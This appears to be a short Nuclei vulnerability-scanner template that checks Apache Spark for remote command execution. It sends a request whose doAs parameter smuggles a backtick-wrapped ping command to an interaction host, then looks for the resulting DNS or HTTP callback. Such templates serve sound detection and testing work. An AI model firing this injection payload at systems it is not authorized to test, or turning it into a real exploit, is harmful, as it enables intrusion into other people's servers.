id: apache-spark-shell-rce

info:
 name: apache-spark-shell-rce
 author: tangxiaofeng7
 severity: high
 reference:
   - https://github.com/tangxiaofeng7
 tags: rce

requests:
 - method: GET
   path:
     - '{{BaseURL}}/?doAs=`ping%20{{interactsh-url}}`'

   matchers:
     - type: word
       part: interactsh_protocol
       name: http
       words:
         - "http"
         - "dns"
